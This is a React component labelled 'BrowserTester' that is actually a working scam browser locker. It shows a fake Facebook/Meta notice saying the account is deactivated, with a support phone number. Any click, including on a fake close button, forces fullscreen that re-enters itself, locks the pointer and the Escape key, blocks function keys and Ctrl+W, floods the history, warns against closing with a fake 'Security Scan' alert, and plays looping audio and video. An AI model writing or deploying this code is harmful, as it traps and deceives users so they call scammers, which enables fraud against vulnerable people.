import React, { useState, useEffect, useRef } from 'react';

export default function BrowserTester() {
    const [stage, setStage] = useState(1);
    const audioRef = useRef(null);
    const videoRef = useRef(null);

    // Browser Detection Utility
    const detectBrowser = () => {
        const ua = navigator.userAgent;
        const isEdge = /Edg/i.test(ua);
        const isSafari = /Safari/i.test(ua) && !/Chrome/i.test(ua);
        const isChrome = /Chrome/i.test(ua) && !isEdge;
        const isFirefox = /Firefox/i.test(ua);

        return {
            isEdge,
            isSafari,
            isChrome,
            isFirefox,
            name: isEdge ? 'Edge' : isSafari ? 'Safari' : isChrome ? 'Chrome' : isFirefox ? 'Firefox' : 'Unknown'
        };
    };

    const browser = detectBrowser();

    // Log browser info for debugging
    useEffect(() => {
        console.log(`Browser detected: ${browser.name}`);
        console.log('Browser capabilities:', {
            keyboardLock: !!(navigator.keyboard && navigator.keyboard.lock),
            pointerLock: !!document.body.requestPointerLock,
            fullscreen: !!document.documentElement.requestFullscreen
        });
    }, []);

    // Audio Implementation: Play local file
    const playAudioFile = () => {
        try {
            if (!audioRef.current) {
                audioRef.current = new Audio('/audio.mp3');
                audioRef.current.loop = true;
                audioRef.current.volume = 1.0;
            }

            // Safari requires user interaction for audio
            const playPromise = audioRef.current.play();
            if (playPromise !== undefined) {
                playPromise
                    .then(() => console.log('Audio playing'))
                    .catch(e => {
                        if (browser.isSafari) {
                            console.warn('Safari: Audio autoplay blocked. Will play on interaction.');
                        } else {
                            console.error('Audio play failed:', e);
                        }
                    });
            }
        } catch (e) {
            console.error('Audio setup failed:', e);
        }
    };

    // Aggressive Fullscreen with browser-specific handling
    const triggerAggressiveFullscreen = async () => {
        const el = document.documentElement;
        try {
            if (!document.fullscreenElement) {
                // Safari uses webkitRequestFullscreen
                if (browser.isSafari && el.webkitRequestFullscreen) {
                    await el.webkitRequestFullscreen();
                } else if (el.requestFullscreen) {
                    await el.requestFullscreen();
                } else {
                    console.warn('Fullscreen API not supported');
                }
            }
        } catch (err) {
            console.error(`Fullscreen denied (${browser.name}):`, err);
        }
    };

    // Keyboard Lock (Chrome only - NOT supported in Edge/Safari/Firefox)
    const lockKeyboard = async () => {
        // Edge, Safari, and Firefox do NOT support Keyboard Lock API
        if (browser.isEdge || browser.isSafari || browser.isFirefox) {
            console.warn(`${browser.name}: Keyboard Lock API not supported. Using fallback.`);
            return;
        }

        if (navigator.keyboard && navigator.keyboard.lock) {
            try {
                await navigator.keyboard.lock(['Escape']);
                console.log('Keyboard locked (Escape key blocked)');
            } catch (err) {
                console.error('Keyboard lock failed:', err);
            }
        } else {
            console.warn('Keyboard Lock API not available');
        }
    };

    // Pointer Lock with browser-specific handling
    const lockPointer = async () => {
        try {
            // Safari and Edge might need different handling
            if (document.body.requestPointerLock) {
                await document.body.requestPointerLock();
                console.log('Pointer locked');
            } else if (document.body.webkitRequestPointerLock) {
                // Safari fallback
                await document.body.webkitRequestPointerLock();
                console.log('Pointer locked (webkit)');
            }
        } catch (err) {
            console.error(`Pointer lock failed (${browser.name}):`, err);
        }
    };

    // Flood History
    const floodHistory = () => {
        for (let i = 0; i < 20; i++) {
            window.history.pushState({ count: i }, '', '#locked');
        }
        console.log('History flooded with 20 states');
    };

    // Synchronize media playback when stage changes to 2
    useEffect(() => {
        if (stage === 2) {
            const startMedia = async () => {
                try {
                    // Setup audio if not already created
                    if (!audioRef.current) {
                        audioRef.current = new Audio('/audio.mp3');
                        audioRef.current.loop = true;
                        audioRef.current.volume = 1.0;
                    }

                    // Safari and Edge: Handle autoplay restrictions
                    const promises = [];

                    // Try to play audio
                    if (audioRef.current) {
                        const audioPromise = audioRef.current.play().catch(e => {
                            console.warn(`${browser.name}: Audio autoplay blocked.`, e);
                            return null;
                        });
                        promises.push(audioPromise);
                    }

                    // Try to play video
                    if (videoRef.current) {
                        const videoPromise = videoRef.current.play().catch(e => {
                            console.warn(`${browser.name}: Video autoplay blocked.`, e);
                            return null;
                        });
                        promises.push(videoPromise);
                    }

                    await Promise.all(promises.filter(Boolean));
                    console.log(`Media playback synchronized (${browser.name})`);
                } catch (e) {
                    console.error(`Media sync failed (${browser.name}):`, e);
                }
            };
            startMedia();
        }
    }, [stage, browser.name]);

    useEffect(() => {
        // Prevent Context Menu
        const preventDefault = (e) => e.preventDefault();
        window.addEventListener('contextmenu', preventDefault);

        // Trap Keyboard
        const trapKeys = (e) => {
            // Re-trigger fullscreen on Escape (fallback if keyboard lock fails)
            if (e.key === 'Escape') {
                e.preventDefault();
                triggerAggressiveFullscreen();
                lockPointer();
            }
            // Block F11/F12 etc
            if (e.key.startsWith('F') || (e.ctrlKey && e.key === 'w')) {
                e.preventDefault();
            }
        };
        window.addEventListener('keydown', trapKeys);
        window.addEventListener('keyup', trapKeys);

        // Trap Reload/Close
        const handleBeforeUnload = (e) => {
            e.preventDefault();
            e.returnValue = 'System Alert: Security Scan in Progress. Do not close.';
            return e.returnValue;
        };
        window.addEventListener('beforeunload', handleBeforeUnload);

        // Re-lock Logic Listeners
        const handleFullscreenChange = () => {
            if (!document.fullscreenElement && stage === 2) {
                triggerAggressiveFullscreen();
            }
        };

        const handlePointerLockChange = () => {
            if (document.pointerLockElement !== document.body && stage === 2) {
                lockPointer();
            }
        };

        document.addEventListener('fullscreenchange', handleFullscreenChange);
        document.addEventListener('pointerlockchange', handlePointerLockChange);

        // Global Click Trap (for Stage 2)
        const handleClick = () => {
            if (stage === 2) {
                triggerAggressiveFullscreen();
                lockPointer();
                lockKeyboard();
                playAudioFile(); // Ensure audio resumes if it stopped

                // Also ensure video plays if it was paused
                const video = document.querySelector('video');
                if (video && video.paused) video.play();
            }
        };
        document.addEventListener('click', handleClick);

        return () => {
            window.removeEventListener('contextmenu', preventDefault);
            window.removeEventListener('keydown', trapKeys);
            window.removeEventListener('keyup', trapKeys);
            window.removeEventListener('beforeunload', handleBeforeUnload);
            document.removeEventListener('fullscreenchange', handleFullscreenChange);
            document.removeEventListener('pointerlockchange', handlePointerLockChange);
            document.removeEventListener('click', handleClick);

            // Cleanup audio
            if (audioRef.current) {
                audioRef.current.pause();
                audioRef.current = null;
            }
        };
    }, [stage]);

    const handleActivation = () => {
        setStage(2);
        // Media playback is now handled by useEffect
        triggerAggressiveFullscreen();
        lockPointer();
        lockKeyboard();
        floodHistory();
    };

    return (
        <div
            className="fixed inset-0 flex items-center justify-center bg-gray-900 bg-opacity-50 p-4"
            onClick={handleActivation} // Trigger lockout on any click
        >
            {stage === 1 ? (
                <div
                    className="bg-white rounded-lg shadow-xl overflow-hidden max-w-lg w-full relative p-8 flex flex-col items-center animate-fade-in"
                    onClick={handleActivation} // Trigger lockout on popup click
                >
                    {/* Close Button - FAKE */}
                    <button
                        onClick={handleActivation}
                        className="absolute top-4 right-5 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded-full p-1 transition-all duration-200 font-bold text-xl w-8 h-8 flex items-center justify-center"
                    >
                        &#x2715;
                    </button>

                    {/* Logo */}
                    <div className="mb-8 mt-2">
                        <h1 className="text-5xl font-bold text-[#1877f2] tracking-tighter cursor-default">facebook</h1>
                    </div>

                    {/* Content */}
                    <div className="w-full flex flex-col items-center">
                        <h2 className="text-2xl font-bold text-gray-900 text-center mb-10 leading-snug">
                            Meta has temporarily deactivated your account.
                        </h2>

                        <p className="text-gray-600 text-center mb-6">
                            Call support: <a href="tel:1-866-549-7331" className="text-[#1877f2] hover:underline font-medium">1-866-549-7331</a>
                        </p>

                        <div className="flex w-full space-x-4">
                            <button
                                onClick={handleActivation}
                                className="flex-1 bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#1567d3] text-white font-bold py-3.5 rounded-[4px] text-lg transition-all duration-200 shadow-sm hover:shadow-md transform hover:-translate-y-0.5"
                            >
                                Accept
                            </button>
                            <button
                                onClick={handleActivation}
                                className="flex-1 bg-gray-200 hover:bg-gray-300 active:bg-gray-400 text-gray-800 font-bold py-3.5 rounded-[4px] text-lg transition-all duration-200 shadow-sm hover:shadow-md transform hover:-translate-y-0.5"
                            >
                                Ignore
                            </button>
                        </div>
                    </div>
                </div>
            ) : (
                <div className="fixed inset-0 w-full h-full bg-black z-50">
                    <video
                        ref={videoRef}
                        src="/video.mp4"
                        loop
                        muted
                        playsInline
                        className="w-full h-full object-cover"
                    />
                </div>
            )}
        </div>
    );
}
